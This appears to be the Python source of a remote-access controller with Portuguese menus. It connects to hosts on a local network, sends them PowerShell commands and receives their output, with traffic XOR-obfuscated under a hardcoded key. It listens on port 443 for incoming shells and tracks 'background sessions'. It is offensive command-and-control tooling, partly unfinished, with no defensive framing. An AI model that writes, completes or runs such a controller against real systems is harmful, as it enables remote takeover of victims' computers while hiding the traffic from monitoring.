import socket
import threading

SERVER_IP = '192.168.0.8'
SERVER_PORT = 12859
SERVER_PORT2 = 12860
LISTEN_PORT = 443
KEY = b'mysecretkey'

class ClientSession:
    def __init__(self):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_host = None
        self.server_port = None
        self.exiting = False
        self.receive_thread = threading.Thread(target=self.receive_server_responses)
        self.current_session = None
        self.client_ip = None  # Variável para armazenar o IP do cliente

    def connect_to_server(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        try:
            self.client_socket.connect((self.server_host, self.server_port))
            print(f"Conectado a {self.server_host}:{self.server_port}")
            self.receive_thread.start()
        except ConnectionRefusedError:
            print("Erro: Conexão recusada. Verifique se o servidor está em execução e se as credenciais estão corretas.")
        except Exception as e:
            print(f"Erro ao conectar: {e}")

    def receive_server_responses(self):
        try:
            while not self.exiting:
                encrypted_response = self.client_socket.recv(4096)
                if not encrypted_response:
                    break
                decrypted_response = self.apply_xor(encrypted_response, KEY)
                print(decrypted_response.decode('utf-8'))
        except Exception as e:
            print(f"Erro durante a recepção de dados do servidor: {e}")

    def send_command(self, command):
        encrypted_command = self.apply_xor(command.encode(), KEY)
        self.client_socket.sendall(encrypted_command)

    def apply_xor(self, data, key):
        key_size = len(key)
        return bytes(data_byte ^ key[i % key_size] for i, data_byte in enumerate(data))

    def leave_background(self, session_info, client_ip):  # Atualização para receber o IP do cliente
        self.current_session = session_info
        self.client_ip = client_ip  # Atualiza o IP do cliente
        print("Sessão deixada em segundo plano:", session_info)
        print("IP do cliente:", client_ip)  # Exibe o IP do cliente

    def list_sessions(self):  # Método para listar sessões
        if self.server_host and self.server_port:
            print(f"Sessão em segundo plano: {SERVER_IP}:{SERVER_PORT}")
            if self.client_ip:
                print(f"IP do cliente: {self.client_ip}")
        else:
            print("Nenhuma sessão em segundo plano ativa.")

def print_menu(client_session):
    ascii_art = """
   _____ _             _   _      _     _____         _             
  / ____| |           | \ | |    | |   |  __ \       | |            
 | |    | |_   _  __ _|  \| | ___| |_  | |__) | __ _| |_ ___  _ __ 
 | |    | | | | |/ _` | . ` |/ _ \ __| |  ___/ '__| __/ _ \| '__|
 | |____| | |_| | (_| | |\  |  __/ |_  | |   | |  | || (_) | |   
  \_____|_|\__,_|\__, |_| \_|\___|\__| |_|   |_|   \__\___/|_|    
                   __/ |                                          
                  |___/                                            
    """
    print(ascii_art)
    print("1. Conectar a outro servidor")
    print("2. Enviar comando PowerShell")
    print("3. Deixar sessão em segundo plano")
    print("4. Listar sessões em segundo plano")
    print("5. Encerrar conexão")
    print("6. Escolher sessão para interagir")
    print("7. Escutar conexão de qualquer origem")

def handle_input(client_session):
    while not client_session.exiting:
        print_menu(client_session)
        opcao = input("Escolha uma opção: ")

        if opcao == '1':
            server_host = input("Digite o endereço IP do servidor: ")
            server_port = int(input("Digite a porta do servidor: "))
            client_session.connect_to_server(server_host, server_port)
        elif opcao == '2':
            command = input("Digite um comando PowerShell (ou 'exit' para sair): ")
            if command.lower() == 'exit':
                client_session.exiting = True
            else:
                client_session.send_command(command)
        elif opcao == '3':
            session_info = f"Sessão em segundo plano: {SERVER_IP}:{SERVER_PORT}"
            client_session.leave_background(session_info, client_session.client_ip)  # Passa o IP do cliente
            input("Pressione Enter para retomar o menu...")
        elif opcao == '4':
            client_session.list_sessions()  # Chama o método para listar sessões
            input("Pressione Enter para retornar ao menu principal...")
        elif opcao == '5':
            print("Encerrando conexão...")
            client_session.exiting = True
        elif opcao == '6':
            manipulate_session(client_session)
        elif opcao == '7':
            listen_for_connections()
        else:
            print("Opção inválida. Tente novamente.")

def listen_for_connections():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('192.168.0.8', LISTEN_PORT))
    server_socket.listen(1)
    print("Aguardando conexão de qualquer origem...")
    client_socket, client_address = server_socket.accept()  # Recebe o endereço do cliente
    print("Nova conexão estabelecida:", client_address)  # Exibe o endereço do cliente
    client_session.leave_background(f"Sessão em segundo plano: {SERVER_IP}:{SERVER_PORT}", client_address[0])  # Passa o IP do cliente
    client_socket.close()

def manipulate_session(client_session):
    session_choice = input("Digite o número da sessão que deseja manipular: ")
    # Lógica para manipular a sessão escolhida

try:
    client_session = ClientSession()
    handle_input(client_session)

except KeyboardInterrupt:
    print("Cliente encerrado manualmente.")

except Exception as e:
    print(f"Erro: {e}")

finally:
    if client_session:
        client_session.client_socket.close()
